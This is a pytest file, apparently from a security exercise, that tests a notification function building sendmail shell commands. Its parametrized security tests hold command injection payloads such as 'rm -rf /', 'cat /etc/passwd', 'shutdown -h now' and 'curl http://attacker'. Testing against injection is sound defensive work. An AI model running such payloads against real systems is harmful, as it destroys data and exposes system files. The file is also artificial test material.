import pytest
from vulnerable import send_notification


def test_functional_valid_notification(monkeypatch):
    captured = {}

    def fake_system(cmd):
        captured["cmd"] = cmd
        return 0

    monkeypatch.setattr("vulnerable.os.system", fake_system)
    result = send_notification("user@example.com", "Alert", "Hello world")
    assert result is True
    assert "echo 'Hello world'" in captured["cmd"]
    assert "sendmail -s 'Alert' user@example.com" in captured["cmd"]


def test_functional_truncates_long_body(monkeypatch):
    captured = {}

    def fake_system(cmd):
        captured["cmd"] = cmd
        return 0

    monkeypatch.setattr("vulnerable.os.system", fake_system)
    long_body = "A" * 10050
    result = send_notification("user@example.com", "Alert", long_body)
    assert result is True
    assert "... [truncated]" in captured["cmd"]
    assert len(captured["cmd"]) < len(long_body) + 100


def test_functional_rejects_missing_to_addr():
    assert send_notification("", "Alert", "Hello") is False
    assert send_notification(None, "Alert", "Hello") is False


def test_functional_rejects_missing_subject():
    assert send_notification("user@example.com", "", "Hello") is False
    assert send_notification("user@example.com", None, "Hello") is False


def test_functional_rejects_invalid_email():
    assert send_notification("not-an-email", "Alert", "Hello") is False
    assert send_notification("user@local", "Alert", "Hello") is False
    assert send_notification("user@example", "Alert", "Hello") is False


@pytest.mark.parametrize(
    "payload",
    [
        "user@example.com; rm -rf /",
        "user@example.com && echo pwned",
        "user@example.com | cat /etc/passwd",
    ],
)
def test_security_malicious_to_addr_payloads(payload):
    with pytest.raises(Exception):
        send_notification(payload, "Alert", "Hello")


@pytest.mark.parametrize(
    "payload",
    [
        "Alert'; shutdown -h now; '",
        "Alert && curl http://attacker",
        "Alert | whoami",
    ],
)
def test_security_malicious_subject_payloads(payload):
    with pytest.raises(Exception):
        send_notification("user@example.com", payload, "Hello")


@pytest.mark.parametrize(
    "payload",
    [
        "Hello'; rm -rf /; '",
        "$(id)",
        "`uname -a`",
    ],
)
def test_security_malicious_body_payloads(payload):
    with pytest.raises(Exception):
        send_notification("user@example.com", "Alert", payload)